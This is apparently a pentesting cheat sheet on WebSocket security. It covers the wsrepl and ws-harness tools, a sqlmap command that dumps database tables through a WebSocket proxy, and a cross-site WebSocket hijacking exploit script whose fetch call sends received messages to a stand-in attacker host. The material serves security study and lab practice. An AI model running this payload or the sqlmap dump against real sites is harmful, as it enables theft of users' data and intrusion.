# web sockets

> websocket is a communication protocol that provides full-duplex communication channels over a single, long-lived connection. this enables real-time, bi-directional communication between clients (typically web browsers) and servers through a persistent connection. websockets are commonly used for web applications that require frequent, low-latency updates, such as live chat applications, online gaming, real-time notifications, and financial trading platforms.


## summary

* [tools](#tools)
* [methodology](#methodology)
    * [using wsrepl](#using-wsrepl)
    * [using ws-harness.py](#using-ws-harness-py)
* [cross-site websocket hijacking (cswsh)](#cross-site-websocket-hijacking-cswsh)
* [labs](#labs)
* [references](#references)


## tools

* [doyensec/wsrepl](https://github.com/doyensec/wsrepl) - websocket repl for pentesters
* [mfowl/ws-harness.py](https://gist.githubusercontent.com/mfowl/ae5bc17f986d4fcc2023738127b06138/raw/e8e82467ade45998d46cef355fd9b57182c3e269/ws.harness.py)


## methodology

### using wsrepl

`wsrepl`, a tool developed by doyensec, aims to simplify the auditing of websocket-based apps. it offers an interactive repl interface that is user-friendly and easy to automate. the tool was developed during an engagement with a client whose web application heavily relied on websockets for soft real-time communication.

wsrepl is designed to provide a balance between an interactive repl experience and automation. it is built with python’s tui framework textual, and it interoperates with curl’s arguments, making it easy to transition from the upgrade request in burp to wsrepl. it also provides full transparency of websocket opcodes as per rfc 6455 and has an automatic reconnection feature in case of disconnects.

```ps1
pip install wsrepl
wsrepl -u url -p auth_plugin.py
```

moreover, wsrepl simplifies the process of transitioning into websocket automation. users just need to write a python plugin. the plugin system is designed to be flexible, allowing users to define hooks that are executed at various stages of the websocket lifecycle (init, on_message_sent, on_message_received, ...).

```py
from wsrepl import plugin
from wsrepl.wsmessage import wsmessage

import json
import requests

class demo(plugin):
    def init(self):
        token = requests.get("https://example.com/uuid").json()["uuid"]
        self.messages = [
            json.dumps({
                "auth": "session",
                "sessionid": token
            })
        ]

    async def on_message_sent(self, message: wsmessage) -> none:
        original = message.msg
        message.msg = json.dumps({
            "type": "message",
            "data": {
                "text": original
            }
        })
        message.short = original
        message.long = message.msg

    async def on_message_received(self, message: wsmessage) -> none:
        original = message.msg
        try:
            message.short = json.loads(original)["data"]["text"]
        except:
            message.short = "error: could not parse message"

        message.long = original
```


### using ws-harness.py

start `ws-harness` to listen on a web-socket, and specify a message template to send to the endpoint.

```powershell
python ws-harness.py -u "ws://dvws.local:8080/authenticate-user" -m ./message.txt
```

the content of the message should contains the **[fuzz]** keyword.

```json
{
    "auth_user":"dgvzda==",
    "auth_pass":"[fuzz]"
}
```

then you can use any tools against the newly created web service, working as a proxy and tampering on the fly the content of message sent thru the websocket.

```python
sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
```


## cross-site websocket hijacking (cswsh)

if the websocket handshake is not correctly protected using a csrf token or a
nonce, it's possible to use the authenticated websocket of a user on an
attacker's controlled site because the cookies are automatically sent by the
browser. this attack is called cross-site websocket hijacking (cswsh).

example exploit, hosted on an attacker's server, that exfiltrates the received
data from the websocket to the attacker:

```html
<script>
  ws = new websocket('wss://vulnerable.example.com/messages');
  ws.onopen = function start(event) {
    ws.send("hello");
  }
  ws.onmessage = function handlereply(event) {
    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
  }
  ws.send("some text sent to the server");
</script>
```

you have to adjust the code to your exact situation. e.g. if your web
application uses a `sec-websocket-protocol` header in the handshake request,
you have to add this value as a 2nd parameter to the `websocket` function call
in order to add this header.


## labs

* [portswigger - manipulating websocket messages to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)
* [portswigger - cross-site websocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
* [portswigger - manipulating the websocket handshake to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)
* [root me - web socket - 0 protection](https://www.root-me.org/en/challenges/web-client/web-socket-0-protection)


## references

- [hacking web sockets: all web pentest tools welcomed - michael fowl - march 5, 2019](https://web.archive.org/web/20190306170840/https://www.vdalabs.com/2019/03/05/hacking-web-sockets-all-web-pentest-tools-welcomed/)
- [hacking with websockets - mike shema, sergey shekyan, vaagn toukharian - september 20, 2012](https://media.blackhat.com/bh-us-12/briefings/shekyan/bh_us_12_shekyan_toukharian_hacking_websocket_slides.pdf)
- [mini websocket ctf - snowscan - january 27, 2020](https://snowscan.io/bbsctf-evilconneck/#)
- [streamlining websocket pentesting with wsrepl - andrez konstantinov - july 18, 2023](https://blog.doyensec.com/2023/07/18/streamlining-websocket-pentesting-with-wsrepl.html)
- [testing for websockets security vulnerabilities - portswigger - september 28, 2019](https://portswigger.net/web-security/websockets)
- [websocket attacks - hacktricks - july 19, 2024](https://book.hacktricks.xyz/pentesting-web/websocket-attacks)